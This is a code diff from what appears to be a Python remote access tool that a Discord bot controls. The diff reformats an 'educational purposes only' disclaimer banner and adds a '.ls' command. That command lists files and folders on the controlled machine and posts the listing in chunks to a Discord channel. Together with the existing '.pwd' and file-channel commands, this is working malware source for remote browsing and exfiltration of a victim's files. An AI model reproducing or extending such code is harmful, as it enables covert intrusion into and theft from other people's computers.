@@ -20,18 +20,18 @@ import winreg
 import pyautogui
 from resources.misc import *
 
-#############################################################################
-#                                                                           #
-#   DISCLAIMER !!! READ BEFORE USING                                        #
-#                                                                           #
-#   Information and code provided in this project are                       #
-#   for educational purposes only. The creator is no                        #
-#   way responsible for any direct or indirect damage                       #
-#   caused due to the misusage of the information.                          #
-#                                                                           #
-#   Everything you do, you are doing at your own risk and responsibility.   #
-#                                                                           #
-#############################################################################
+###############################################################################
+##                                                                           ##
+##   DISCLAIMER !!! READ BEFORE USING                                        ##
+##                                                                           ##
+##   Information and code provided in this project are                       ##
+##   for educational purposes only. The creator is no                        ##
+##   way responsible for any direct or indirect damage                       ##
+##   caused due to the misusage of the information.                          ##
+##                                                                           ##
+##   Everything you do, you are doing at your own risk and responsibility.   ##
+##                                                                           ##
+###############################################################################
 
 # ----------- Begin of config ---------- #
 # - Please check out README.md before  - #
@@ -214,6 +214,27 @@ async def on_message(message):
 
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content == '.ls':
+            dir_content_f, dir_content_d, directory_content = [], [], []
+            for element in os.listdir('/'.join(working_directory)):
+                if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
+                else: dir_content_d.append(element)
+            dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
+            for single_directory in dir_content_d: directory_content.append(single_directory)
+            for single_file in dir_content_f: directory_content.append(single_file)
+            await message.channel.send('```Content of ' + '/'.join(working_directory) +' at ' + current_time() + '```')
+            lsoutput = directory_content
+            while lsoutput != []:
+                if len('\n'.join(lsoutput)) > 1994:
+                    temp = ''
+                    while len(temp+lsoutput[0])+1 < 1994:
+                        temp += lsoutput[0] + '\n'
+                        lsoutput.pop(0)
+                    await message.channel.send('```' + temp + '```')
+                else:
+                    await message.channel.send('```' + '\n'.join(lsoutput) + '```')
+                    lsoutput = []
 
         elif message.content == '.pwd':
             reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
